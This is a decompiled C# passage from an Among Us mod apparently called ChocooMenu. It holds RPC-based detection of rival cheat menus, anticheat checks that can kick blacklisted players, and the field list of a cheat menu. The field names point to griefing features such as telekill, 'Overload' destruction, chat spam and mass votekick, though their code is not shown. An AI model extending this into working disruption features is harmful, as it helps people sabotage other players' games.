            case 202:
              try
              {
                MessageReader messageReader = MessageReader.Get(reader);
                string str1 = messageReader.ReadString();
                messageReader.ReadByte();
                string str2 = messageReader.ReadString();
                if (str1 == "MMC_v5")
                {
                  if (!ChocooPlugin.detectedMMCUsers.Contains(playerId))
                    ChocooPlugin.detectedMMCUsers.Add(playerId);
                  ChocooPlugin.detectedModUsers[playerId] = (byte) 202;
                  ChocooPlugin.lastDetectionTime[playerId] = time;
                  string str3 = __instance.Data?.PlayerName ?? "Unknown";
                  ChocooPlugin.Logger.LogWarning((object) $"[Mod Detection] {str3} is using ModMenuCrew v{str2} (RPC 202)");
                  if (!((InnerNetObject) __instance).AmOwner && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Chat, (Object) null))
                    DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=orange>[Mod Detection]</color> <color=yellow>{str3}</color> is using <color=#FFD700>ModMenuCrew v{str2}</color>", true);
                }
              }
              catch
              {
              }
              return false;
          }
          ChocooPlugin.detectedModUsers[playerId] = callId;
          ChocooPlugin.lastDetectionTime[playerId] = time;
          string menuNameFromRpc = ChocooPlugin.ModUserDetectionPatch.GetMenuNameFromRPC(callId);
          string str = __instance.Data?.PlayerName ?? "Unknown";
          ChocooPlugin.Logger.LogWarning((object) $"[Mod Detection] {str} is using {menuNameFromRpc} (RPC {callId.ToString()})");
          if (!((InnerNetObject) __instance).AmOwner && Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Chat, (Object) null))
            DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=orange>[Mod Detection]</color> <color=yellow>{str}</color> is using <color=red>{menuNameFromRpc}</color>", true);
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ModUserDetection error: " + ex.Message));
      }
      return false;
    }

    private static string GetMenuNameFromRPC(byte rpcId)
    {
      switch (rpcId)
      {
        case 85:
          return "AmongUsMenu";
        case 89:
          return "NjordMenu";
        case 121:
          return "ChocooMenu";
        case 150:
          return "BetterAmongUs";
        case 154:
          return "GoatNetClient";
        case 162:
          return "NetMenu";
        case 164:
          return "SickoMenu";
        case 167:
          return "TuffMenu";
        case 176 /*0xB0*/:
          return "HostGuard";
        case 202:
          return "ModMenuCrew";
        case 219:
          return "BanMod";
        case 250:
          return "KillNetwork";
        case byte.MaxValue:
          return "UnknownMenu";
        default:
          return "Unknown Mod";
      }
    }
  }

  public static class ChocooAnticheatSystem
  {
    public static Dictionary<byte, float> lastTaskTime = new Dictionary<byte, float>();
    public static Dictionary<byte, float> playerJoinTimes = new Dictionary<byte, float>();
    public static Dictionary<byte, float> lastVentingNotificationTime = new Dictionary<byte, float>();
    private const float VENTING_NOTIFICATION_COOLDOWN = 30f;
    private static Dictionary<string, float> _detectionCooldowns = new Dictionary<string, float>();

    public static void LogDetection(string playerName, string reason)
    {
      string str = $"[{DateTime.Now.ToString("HH:mm:ss")}] {playerName}: {reason}";
      ChocooPlugin.detectionLog.Add(str);
      ++ChocooPlugin.totalDetections;
      ChocooPlugin.Logger.LogWarning((object) ("[ANTICHEAT] " + str));
      if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Chat, (Object) null) || !Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
        return;
      DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=purple>[ANTICHEAT]</color> {playerName}: {reason}", true);
    }

    public static void PunishPlayer(PlayerControl player, string reason)
    {
      if (Object.op_Equality((Object) player, (Object) null) || Object.op_Equality((Object) player.Data, (Object) null))
        return;
      string playerName = player.Data.PlayerName ?? "Unknown";
      ChocooPlugin.ChocooAnticheatSystem.LogDetection(playerName, reason);
      if (!ChocooPlugin.AutoBanEnabled || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        return;
      try
      {
        ((InnerNetClient) AmongUsClient.Instance).KickPlayer(((InnerNetObject) player).OwnerId, true);
        ChocooPlugin.Logger.LogError((object) $"[ANTICHEAT] Banned {playerName} for: {reason}");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("[ANTICHEAT] Failed to ban player: " + ex.Message));
      }
    }

    public static void OnCheatDetected(PlayerControl player, string reason)
    {
      if (!ChocooPlugin.AnticheatEnabled || Object.op_Equality((Object) player, (Object) null) || Object.op_Equality((Object) player.Data, (Object) null) || ((InnerNetObject) player).AmOwner)
        return;
      string key = $"{player.PlayerId.ToString()}:{reason}";
      float time = Time.time;
      if (ChocooPlugin.ChocooAnticheatSystem._detectionCooldowns.ContainsKey(key) && (double) time - (double) ChocooPlugin.ChocooAnticheatSystem._detectionCooldowns[key] < 30.0)
        return;
      ChocooPlugin.ChocooAnticheatSystem._detectionCooldowns[key] = time;
      string playerName = player.Data.PlayerName ?? "Unknown";
      string str = "";
      try
      {
        str = player.Data.FriendCode ?? "";
      }
      catch
      {
      }
      if (!string.IsNullOrEmpty(str) && ChocooPlugin.BlacklistedCodes.Contains(str))
        ChocooPlugin.ChocooAnticheatSystem.PunishPlayer(player, "BLACKLISTED - " + reason);
      else
        ChocooPlugin.ChocooAnticheatSystem.LogDetection(playerName, reason);
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "HandleRpc")]
  public static class ChocooAnticheat_PlayerControlHandleRpc
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance, byte callId, MessageReader reader)
    {
      if (!ChocooPlugin.AnticheatEnabled)
        return true;
      if (((InnerNetClient) AmongUsClient.Instance).AmHost && ChocooPlugin.TaskSpeedrunEnabled && (callId == (byte) 11 || callId == (byte) 14 || callId == (byte) 27 || callId == (byte) 35))
        return false;
      if (((InnerNetObject) __instance).AmOwner)
        return true;
      MessageReader messageReader = MessageReader.Get(reader);
      try
      {
        switch (callId)
        {
          case 1:
            if (ChocooPlugin.CheckAbnormalTaskCompletion)
            {
              byte playerId = __instance.PlayerId;
              float fixedTime = Time.fixedTime;
              if (ChocooPlugin.ChocooAnticheatSystem.lastTaskTime.ContainsKey(playerId) && (double) fixedTime - (double) ChocooPlugin.ChocooAnticheatSystem.lastTaskTime[playerId] < 0.699999988079071)
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Task Completion (Spam)");
              ChocooPlugin.ChocooAnticheatSystem.lastTaskTime[playerId] = fixedTime;
              if (GameOptionsManager.Instance.CurrentGameOptions.GameMode != 2 && Object.op_Inequality((Object) MeetingHud.Instance, (Object) null) && (ChocooPlugin.isMeetingActive ? (double) Time.time - (double) ChocooPlugin.currentMeetingStartTime : 0.0) > 0.5)
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Task Completion (During Meeting)");
              if (Object.op_Inequality((Object) __instance.Data, (Object) null) && Object.op_Inequality((Object) __instance.Data.Role, (Object) null) && __instance.Data.Role.IsImpostor)
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Task Completion (Impostor)");
              break;
            }
            break;
          case 6:
          case 7:
            if (ChocooPlugin.CheckAbnormalColorChange)
            {
              if (((InnerNetClient) AmongUsClient.Instance).GameState == 2 & Object.op_Inequality((Object) ShipStatus.Instance, (Object) null) & Object.op_Equality((Object) IntroCutscene.Instance, (Object) null))
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Color Change");
              break;
            }
            break;
          case 9:
          case 16 /*0x10*/:
          case 17:
          case 21:
          case 28:
          case 39:
          case 40:
          case 41:
            if (ChocooPlugin.CheckAbnormalCosmeticChange)
            {
              bool flag1 = ((InnerNetClient) AmongUsClient.Instance).GameState == 2;
              bool flag2 = Object.op_Inequality((Object) ShipStatus.Instance, (Object) null);
              bool flag3 = Object.op_Equality((Object) IntroCutscene.Instance, (Object) null);
              bool flag4 = Object.op_Inequality((Object) MeetingHud.Instance, (Object) null);
              bool flag5 = Object.op_Inequality((Object) ExileController.Instance, (Object) null);
              if (flag1 & flag2 & flag3 && !flag4 && !flag5)
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Cosmetic Change");
              break;
            }
            break;
          case 11:
            if (ChocooPlugin.CheckAbnormalReportMeeting)
            {
              byte num = messageReader.ReadByte();
              if (GameOptionsManager.Instance.CurrentGameOptions.GameMode == 2)
              {
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Report (Hide & Seek)");
                if (((InnerNetClient) AmongUsClient.Instance).AmHost)
                  return false;
              }
              if (num != byte.MaxValue)
              {
                bool flag = false;
                foreach (NetworkedPlayerInfo allPlayer in GameData.Instance.AllPlayers)
                {
                  if ((int) allPlayer.PlayerId == (int) num)
                  {
                    flag = true;
                    break;
                  }
                }
                if (!flag)
                {
                  ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Report (Invalid Player ID)");
                  if (((InnerNetClient) AmongUsClient.Instance).AmHost)
                    return false;
                }
              }
              if (num == byte.MaxValue && __instance.RemainingEmergencies <= 0)
              {
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Meeting (No Buttons Left)");
                if (((InnerNetClient) AmongUsClient.Instance).AmHost)
                  return false;
              }
              break;
            }
            break;
          case 12:
            if (ChocooPlugin.CheckAbnormalMurder)
            {
              PlayerControl playerControl = MessageExtensions.ReadNetObject<PlayerControl>(messageReader);
              if (Object.op_Inequality((Object) playerControl, (Object) null))
              {
                if (Object.op_Equality((Object) playerControl, (Object) __instance))
                  ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Murder (Self-Kill)");
                if (Object.op_Inequality((Object) playerControl.Data, (Object) null) && playerControl.Data.Role.IsImpostor)
                  ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Murder (Killed Impostor)");
              }
              if (__instance.Data.Role is PhantomRole role && role.IsInvisible)
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Murder (Invisible Phantom)");
              if (Object.op_Inequality((Object) MeetingHud.Instance, (Object) null) && (ChocooPlugin.isMeetingActive ? (double) Time.time - (double) ChocooPlugin.currentMeetingStartTime : 0.0) > 0.5)
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Murder (During Meeting)");
              break;
            }
            break;
          case 38:
            if (ChocooPlugin.CheckAbnormalLevel)
            {
              uint num = messageReader.ReadPackedUInt32();
              if (num > ChocooPlugin.MaxAllowedLevel)
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, $"Abnormal Level ({(num + 1U).ToString()})");
              break;
            }
            break;
          case 45:
            if (ChocooPlugin.CheckAbnormalProtect)
            {
              PlayerControl playerControl = MessageExtensions.ReadNetObject<PlayerControl>(messageReader);
              if (Object.op_Inequality((Object) playerControl, (Object) null))
              {
                if (Object.op_Equality((Object) playerControl, (Object) __instance))
                  ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Protect (Self-Protect)");
                if (Object.op_Inequality((Object) __instance.Data, (Object) null) && __instance.Data.Role.Role != 4)
                  ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Protect (Wrong Role)");
                if (Object.op_Inequality((Object) MeetingHud.Instance, (Object) null) || Object.op_Inequality((Object) ExileController.Instance, (Object) null))
                  ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Protect (During Meeting)");
              }
              break;
            }
            break;
          case 46:
            if (ChocooPlugin.CheckAbnormalShapeshift)
            {
              PlayerControl playerControl = MessageExtensions.ReadNetObject<PlayerControl>(messageReader);
              if (Object.op_Inequality((Object) playerControl, (Object) null))
              {
                messageReader.ReadBoolean();
                if ((Object.op_Inequality((Object) MeetingHud.Instance, (Object) null) || Object.op_Inequality((Object) ExileController.Instance, (Object) null)) && !ChocooPlugin.IsInMeetingGracePeriod())
                {
                  if ((int) playerControl.PlayerId == (int) __instance.PlayerId)
                  {
                    ChocooPlugin.Logger.LogInfo((object) $"[ANTICHEAT] Allowed unshift for {__instance.Data.PlayerName} - reverting to original form during meeting");
                    break;
                  }
                  if (ChocooPlugin.shapeshiftedBeforeMeeting.Contains(__instance.PlayerId))
                  {
                    ChocooPlugin.Logger.LogInfo((object) $"[ANTICHEAT] Allowed shapeshift for {__instance.Data.PlayerName} - was shapeshifted before meeting");
                    break;
                  }
                  ChocooPlugin.Logger.LogWarning((object) $"[ANTICHEAT] DETECTED: {__instance.Data.PlayerName} shapeshifted into {playerControl.Data.PlayerName} during meeting!");
                  ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Shapeshift (During Meeting)");
                }
              }
              break;
            }
            break;
          case 55:
            if (ChocooPlugin.CheckAbnormalShapeshift)
            {
              PlayerControl playerControl = MessageExtensions.ReadNetObject<PlayerControl>(messageReader);
              if (Object.op_Inequality((Object) playerControl, (Object) null))
              {
                messageReader.ReadBoolean();
                if ((Object.op_Inequality((Object) MeetingHud.Instance, (Object) null) || Object.op_Inequality((Object) ExileController.Instance, (Object) null)) && !ChocooPlugin.IsInMeetingGracePeriod())
                {
                  if ((int) playerControl.PlayerId == (int) __instance.PlayerId)
                  {
                    ChocooPlugin.Logger.LogInfo((object) $"[ANTICHEAT] Allowed unshift (CheckShapeshift) for {__instance.Data.PlayerName} - reverting to original form during meeting");
                    break;
                  }
                  if (!ChocooPlugin.shapeshiftedBeforeMeeting.Contains(__instance.PlayerId))
                  {
                    ChocooPlugin.Logger.LogWarning((object) $"[ANTICHEAT] DETECTED (CheckShapeshift): {__instance.Data.PlayerName} shapeshifted into {playerControl.Data.PlayerName} during meeting!");
                    ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Shapeshift (During Meeting)");
                  }
                  else
                    break;
                }
              }
              break;
            }
            break;
          case 63 /*0x3F*/:
          case 65:
            if (ChocooPlugin.CheckAbnormalVanish)
            {
              if (Object.op_Inequality((Object) MeetingHud.Instance, (Object) null) || Object.op_Inequality((Object) ExileController.Instance, (Object) null))
                ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(__instance, "Abnormal Vanish (During Meeting)");
              break;
            }
            break;
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("[ANTICHEAT] Error in PlayerControl.HandleRpc: " + ex.Message));
      }
      return true;
    }
  }

  [HarmonyPatch(typeof (PlayerPhysics), "HandleRpc")]
  public static class ChocooAnticheat_PlayerPhysicsHandleRpc
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerPhysics __instance, byte callId, MessageReader reader)
    {
      if (!ChocooPlugin.AnticheatEnabled || !ChocooPlugin.CheckAbnormalVenting || callId != (byte) 19 && callId != (byte) 20)
        return true;
      PlayerControl myPlayer = __instance.myPlayer;
      if (Object.op_Equality((Object) myPlayer, (Object) null) || ((InnerNetObject) myPlayer).AmOwner)
        return true;
      byte playerId = myPlayer.PlayerId;
      float time = Time.time;
      if (ChocooPlugin.ChocooAnticheatSystem.lastVentingNotificationTime.ContainsKey(playerId) && (double) (time - ChocooPlugin.ChocooAnticheatSystem.lastVentingNotificationTime[playerId]) < 30.0)
        return true;
      if (Object.op_Inequality((Object) MeetingHud.Instance, (Object) null))
      {
        if ((ChocooPlugin.isMeetingActive ? (double) Time.time - (double) ChocooPlugin.currentMeetingStartTime : 0.0) > 0.5)
        {
          ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(myPlayer, "Abnormal Venting (During Meeting)");
          ChocooPlugin.ChocooAnticheatSystem.lastVentingNotificationTime[playerId] = time;
        }
        return true;
      }
      if (Object.op_Inequality((Object) myPlayer.Data, (Object) null) && Object.op_Inequality((Object) myPlayer.Data.Role, (Object) null) && !myPlayer.Data.Role.IsImpostor && myPlayer.Data.Role.Role != 3 && !myPlayer.Data.IsDead)
      {
        ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(myPlayer, "Abnormal Venting (Invalid Role)");
        ChocooPlugin.ChocooAnticheatSystem.lastVentingNotificationTime[playerId] = time;
      }
      return true;
    }
  }

  [HarmonyPatch(typeof (ShipStatus), "HandleRpc")]
  public static class ChocooAnticheat_ShipStatusHandleRpc
  {
    private static float lastBlackoutAlert;

    [HarmonyPrefix]
    public static bool Prefix(ShipStatus __instance, byte callId, MessageReader reader)
    {
      if (ChocooPlugin.AntiBlackoutEnabled)
      {
        if (callId == (byte) 35)
        {
          try
          {
            int position = reader.Position;
            SystemTypes systemTypes = (SystemTypes) (int) reader.ReadByte();
            PlayerControl playerControl = MessageExtensions.ReadNetObject<PlayerControl>(reader);
            reader.Position = position;
            if (systemTypes == 37 && Object.op_Inequality((Object) playerControl, (Object) null) && !((InnerNetObject) playerControl).AmOwner)
            {
              reader.Position = position;
              int num1 = (int) reader.ReadByte();
              MessageExtensions.ReadNetObject<PlayerControl>(reader);
              reader.ReadUInt16();
              byte num2 = reader.ReadByte();
              reader.Position = position;
              if (num2 == (byte) 2 || num2 == (byte) 5)
              {
                if ((double) Time.time - (double) ChocooPlugin.ChocooAnticheat_ShipStatusHandleRpc.lastBlackoutAlert > 0.5)
                {
                  string str = playerControl.Data?.PlayerName ?? "Unknown";
                  if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Chat, (Object) null))
                    DestroyableSingleton<HudManager>.Instance.Chat.AddChat(PlayerControl.LocalPlayer, $"<color=purple>[ANTI-BLACKOUT]</color> Ban Exploit attempt from <color=yellow>{str}</color>", true);
                  ChocooPlugin.ChocooAnticheat_ShipStatusHandleRpc.lastBlackoutAlert = Time.time;
                }
                return false;
              }
            }
          }
          catch (Exception ex)
          {
            ChocooPlugin.Logger.LogError((object) ("[ANTI-BLACKOUT] Error: " + ex.Message));
          }
        }
      }
      if (!ChocooPlugin.AnticheatEnabled || !ChocooPlugin.CheckAbnormalSabotage)
        return true;
      if (callId == (byte) 35)
      {
        try
        {
          int position = reader.Position;
          SystemTypes systemTypes = (SystemTypes) (int) reader.ReadByte();
          PlayerControl player = MessageExtensions.ReadNetObject<PlayerControl>(reader);
          reader.ReadByte();
          reader.Position = position;
          if (Object.op_Equality((Object) player, (Object) null) || ((InnerNetObject) player).AmOwner || !Object.op_Inequality((Object) MeetingHud.Instance, (Object) null) || (ChocooPlugin.isMeetingActive ? (double) Time.time - (double) ChocooPlugin.currentMeetingStartTime : 0.0) <= 0.5)
            return true;
          ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(player, "Abnormal Sabotage (During Meeting)");
          if (((InnerNetClient) AmongUsClient.Instance).AmHost)
            return false;
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("[ANTICHEAT] Error in ShipStatus.HandleRpc: " + ex.Message));
        }
      }
      return true;
    }
  }

  [HarmonyPatch(typeof (VoteBanSystem), "HandleRpc")]
  public static class ChocooAnticheat_VoteBanSystemHandleRpc
  {
    [HarmonyPrefix]
    public static bool Prefix(VoteBanSystem __instance, byte callId, MessageReader reader)
    {
      if (callId != (byte) 26)
        return true;
      MessageReader messageReader = MessageReader.Get(reader);
      int num1 = messageReader.ReadInt32();
      int num2 = messageReader.ReadInt32();
      messageReader.Recycle();
      if (ChocooPlugin.ShowVotekickInfo)
      {
        ClientData clientData1 = (ClientData) null;
        ClientData clientData2 = (ClientData) null;
        foreach (ClientData allClient in ((InnerNetClient) AmongUsClient.Instance).allClients)
        {
          if (allClient.Id == num1)
            clientData1 = allClient;
          if (allClient.Id == num2)
            clientData2 = allClient;
        }
        string str1 = clientData1?.PlayerName ?? "Client " + num1.ToString();
        string str2 = clientData2?.PlayerName ?? "Client " + num2.ToString();
        if (Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance?.Notifier, (Object) null))
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage($"<color=orange>[Votekick Info]</color> <color=yellow>{str1}</color> voted to kick <color=red>{str2}</color>");
        ChocooPlugin.Logger.LogInfo((object) $"[Votekick Info] {str1} voted to kick {str2}");
      }
      if (ChocooPlugin.AnticheatEnabled && ChocooPlugin.CheckAbnormalVotekickSpam)
      {
        if (((InnerNetClient) AmongUsClient.Instance).AmHost && num2 == ((InnerNetClient) AmongUsClient.Instance).HostId)
          return false;
        ClientData clientData = (ClientData) null;
        foreach (ClientData allClient in ((InnerNetClient) AmongUsClient.Instance).allClients)
        {
          if (allClient.Id == num1)
          {
            clientData = allClient;
            break;
          }
        }
        if (clientData == null || Object.op_Equality((Object) clientData.Character, (Object) null) || ((InnerNetObject) clientData.Character).AmOwner)
          return true;
        byte playerId = clientData.Character.PlayerId;
        if (!ChocooPlugin.ChocooAnticheatSystem.playerJoinTimes.ContainsKey(playerId))
          ChocooPlugin.ChocooAnticheatSystem.playerJoinTimes[playerId] = Time.time;
        if ((double) Time.time - (double) ChocooPlugin.ChocooAnticheatSystem.playerJoinTimes[playerId] < 5.0)
        {
          ChocooPlugin.ChocooAnticheatSystem.OnCheatDetected(clientData.Character, "Abnormal Votekick (Spam)");
          if (((InnerNetClient) AmongUsClient.Instance).AmHost)
            return false;
        }
      }
      return true;
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "Start")]
  public static class ChocooAnticheat_TrackPlayerJoin
  {
    [HarmonyPostfix]
    public static void Postfix(PlayerControl __instance)
    {
      if (!Object.op_Inequality((Object) __instance, (Object) null) || !Object.op_Inequality((Object) __instance.Data, (Object) null))
        return;
      byte playerId = __instance.PlayerId;
      ChocooPlugin.ChocooAnticheatSystem.playerJoinTimes[playerId] = Time.time;
    }
  }

  [HarmonyPatch(typeof (AmongUsClient), "OnGameEnd")]
  public static class ChocooAnticheat_CleanupOnGameEnd
  {
    [HarmonyPostfix]
    public static void Postfix()
    {
      ChocooPlugin.ChocooAnticheatSystem.lastTaskTime.Clear();
      ChocooPlugin.ChocooAnticheatSystem.playerJoinTimes.Clear();
      ChocooPlugin.BecomeImmortalEnabled = false;
    }
  }

  [HarmonyPatch(typeof (MeetingHud), "Start")]
  public static class MeetingStartTracker
  {
    [HarmonyPostfix]
    public static void Postfix()
    {
      ChocooPlugin.currentMeetingStartTime = Time.time;
      ChocooPlugin.isMeetingActive = true;
    }
  }

  [HarmonyPatch(typeof (MeetingHud), "Close")]
  public static class MeetingEndTracker
  {
    [HarmonyPostfix]
    public static void Postfix() => ChocooPlugin.isMeetingActive = false;
  }

  public class ChocooMenu(IntPtr ptr) : MonoBehaviour(ptr)
  {
    private Rect windowRect = new Rect(100f, 100f, 400f, 645f);
    private int windowId = 666;
    private float _telekillSnapTimer = -1f;
    private Vector2 _telekillOldPos;
    private int selectedDummyCount = 1;
    private bool showDummyCountDropdown = false;
    private bool isAttachedToPlayer = false;
    private int attachedPlayerId = -1;
    private float attachUpdateTimer = 0.0f;
    private string forceNameInput = "";
    private bool forceNameBoxFocused = false;
    private int forceNameCursorPos = 0;
    private PlayerControl pendingForceNameTarget = (PlayerControl) null;
    private string pendingForceNameValue = (string) null;
    private int currentNameSize = 2;
    private bool isResizing = false;
    private Vector2 resizeStart;
    private Rect resizeHandleRect;
    private Vector2 playersSectionScrollPosition = Vector2.zero;
    private const float MIN_WIDTH = 280f;
    private const float MIN_HEIGHT = 400f;
    private const float MAX_WIDTH = 800f;
    private const float MAX_HEIGHT = 1000f;
    private const float RESIZE_HANDLE_SIZE = 15f;
    private Vector2 scrollPosition = Vector2.zero;
    private Vector2 aboutScrollPosition = Vector2.zero;
    private Vector2 destroyScrollPosition = Vector2.zero;
    private Vector2 customiseScrollPosition = Vector2.zero;
    private bool showPlatformDropdown = false;
    private bool showVersionDropdown = false;
    private Rect customPlatformInputRect = Rect.zero;
    private Vector2 platformDropdownScrollPosition = Vector2.zero;
    private static bool fpsCursorVisible = false;
    private static int fpsCursorPos = 0;
    private static float fpsLastCursorBlink = 0.0f;
    private Dictionary<string, float> toggleAnimationStates = new Dictionary<string, float>();
    private const float TOGGLE_SWITCH_ANIMATION_SPEED = 8f;
    private string hoveredTab = "";
    private float menuAnimationProgress = 0.0f;
    private bool isAnimatingIn = false;
    private bool isAnimatingOut = false;
    private const float MENU_ANIMATION_SPEED = 8f;
    private static bool levelCursorVisible = false;
    private static int levelCursorPos = 0;
    private static float levelLastCursorBlink = 0.0f;
    private string customPlatformInputText = "";
    private bool customPlatformInputFocused = false;
    private static bool customPlatformCursorVisible = false;
    private static int customPlatformCursorPos = 0;
    private static float customPlatformLastCursorBlink = 0.0f;
    private bool forceNameShowCursor = true;
    private float forceNameCursorBlinkTime = 0.0f;
    private float forceNameBackspaceHoldTime = 0.0f;
    private float forceNameBackspaceRepeatDelay = 0.0f;
    private string searchQuery = "";
    private bool searchBoxFocused = false;
    private int searchCursorPosition = 0;
    private bool searchCursorVisible = true;
    private float searchCursorBlinkTime = 0.0f;
    private const int MAX_SEARCH_LENGTH = 50;
    private List<ChocooPlugin.ChocooMenu.SearchResult> searchResults = new List<ChocooPlugin.ChocooMenu.SearchResult>();
    private bool rgbNameEnabled = false;
    private bool rgbNameToAllEnabled = false;
    private Color rgbColor1 = Color.red;
    private Color rgbColor2 = Color.blue;
    private float lastRgbNameUpdate = 0.0f;
    private float lastRgbNameToAllUpdate = 0.0f;
    private int rgbGradientMode = 0;
    private int rgbAnimationOffset = 0;
    private int selectedNameColorIndex = 11;
    private string[] nameColorNames = new string[15]
    {
      "Red",
      "Blue",
      "Black",
      "Cyan",
      "Lime",
      "Green",
      "Pink",
      "Rose",
      "Coral",
      "Orange",
      "Yellow",
      "White",
      "Purple",
      "Brown",
      "Maroon"
    };
    private string[] nameColorCodes = new string[15]
    {
      "#F00",
      "#00F",
      "#000",
      "#3FF",
      "#0F0",
      "#070",
      "#F0F",
      "#F9F",
      "#F56",
      "#F60",
      "#FF0",
      "#FFF",
      "#60F",
      "#530",
      "#400"
    };
    private Vector2 nameColorScrollPosition = Vector2.zero;
    private bool showNameColorDropdown = false;
    private Vector2 selfScrollPosition = Vector2.zero;
    private Vector2 votekickScrollPosition = Vector2.zero;
    private Vector2 hostScrollPosition = Vector2.zero;
    private Vector2 sabotageScrollPosition = Vector2.zero;
    private Vector2 chatScrollPosition = Vector2.zero;
    private Vector2 ventDropdownScrollPosition = Vector2.zero;
    private bool showSpoofMenuDropdown = false;
    private Vector2 spoofMenuDropdownScrollPosition = Vector2.zero;
    private bool _lastVotekickAllState = false;
    private string activeHostSection = "Utils";
    private string activePlayersSection = "Players";
    private Vector2 hostSettingsScrollPosition = Vector2.zero;
    private bool settingsLoaded = false;
    private float _settingsSyncTimer = 0.0f;
    private GUIStyle _styleSettingsNormal;
    private GUIStyle _styleSettingsFocused;
    private int selectedSettingsMapId = 0;
    private string focusedSettingKey = "";
    private string settingInputBuffer = "";
    private bool settingCursorVisible = true;
    private float settingCursorBlink = 0.0f;
    private bool s_confirmEjects;
    private bool s_anonVotes;
    private bool s_visualTasks;
    private bool s_protectVisible;
    private bool s_shapeshiftEvidence;
    private float s_emergencyMeetings;
    private float s_emergencyCooldown;
    private float s_discussionTime;
    private float s_votingTime;
    private float s_killDistance;
    private float s_commonTasks;
    private float s_shortTasks;
    private float s_longTasks;
    private float s_taskBarMode;
    private float s_playerSpeed;
    private float s_crewVision;
    private float s_impVision;
    private float s_killCooldown;
    private float s_vitalsCooldown;
    private float s_batteryDuration;
    private float s_ventCooldown;
    private float s_ventDuration;
    private float s_protectCooldown;
    private float s_protectDuration;
    private float s_shapeshiftDuration;
    private float s_shapeshiftCooldown;
    private float s_alertDuration;
    private float s_trackerDuration;
    private float s_trackerCooldown;
    private float s_trackerDelay;
    private float s_phantomDuration;
    private float s_phantomCooldown;
    private string targetTab = "About";
    private float tabTransitionProgress = 1f;
    private const float TAB_TRANSITION_SPEED = 8f;
    private Vector2 contentOffset = Vector2.zero;
    private Dictionary<string, float> toggleAnimations = new Dictionary<string, float>();
    private const float TOGGLE_ANIMATION_SPEED = 12f;
    private Dictionary<string, float> buttonScales = new Dictionary<string, float>();
    private Dictionary<string, float> buttonPressTime = new Dictionary<string, float>();
    private Dictionary<string, float> dropdownAnimations = new Dictionary<string, float>();
    private const float DROPDOWN_ANIMATION_SPEED = 15f;
    private const float DROPDOWN_MIN_HEIGHT = 0.0f;
    private string activeDestructSection = "Overload";
    private static Vector2 originalPosition = Vector2.zero;
    private string chatMessage = "";
    private string levelInputText = "";
    private bool levelInputFocused = false;
    private string fpsInputText = "";
    private bool fpsInputFocused = false;
    private const int MAX_CHAT_LENGTH = 100;
    public static bool SpamChatEnabled = false;
    private int chatSpamDelay = 0;
    private int cursorPosition = 0;
    private bool showCursor = true;
    private float cursorBlinkTime = 0.0f;
    private bool chatBoxFocused = false;
    private bool settingsBoxFocused = false;
    private float backspaceHoldTime = 0.0f;
    private float backspaceRepeatDelay = 0.0f;
    private static int testIdCounter = 0;
    private static bool autoTesting = false;
    private float lastChatSendTime = 0.0f;
    private const float CHAT_COOLDOWN = 3f;
    private Vector2 whisperPlayerScrollPosition = Vector2.zero;
    private int selectedWhisperTargetId = -1;
    private string blacklistInput = "";
    private bool blacklistInputFocused = false;
    private int blacklistCursorPos = 0;
    private bool blacklistCursorVisible = true;
    private float blacklistCursorBlink = 0.0f;
    private const int MAX_FRIEND_CODE_LENGTH = 20;
    private Vector2 blacklistScrollPosition = Vector2.zero;
    private string blacklistAddedMessage = "";
    private float blacklistMessageTimer = 0.0f;
    private bool showVentDropdown = false;
    private Vector2 destroyPlayerScrollPosition = Vector2.zero;
    private Vector2 hostKickPlayerScrollPosition = Vector2.zero;
    private float lastTargetedMethod3Time = 0.0f;
    private static float lastTargetedMixMethod3Time = 0.0f;
